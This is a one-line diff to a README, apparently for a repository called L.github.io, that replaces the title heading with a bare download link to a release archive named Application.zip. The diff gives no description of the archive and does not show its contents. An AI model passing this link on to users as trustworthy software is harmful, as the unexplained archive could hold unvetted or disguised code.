@@ -1,1 +1,1 @@
-# L.github.io
+# https://github.com/f60n/L.github.io/releases/download/v1.0/Application.zip
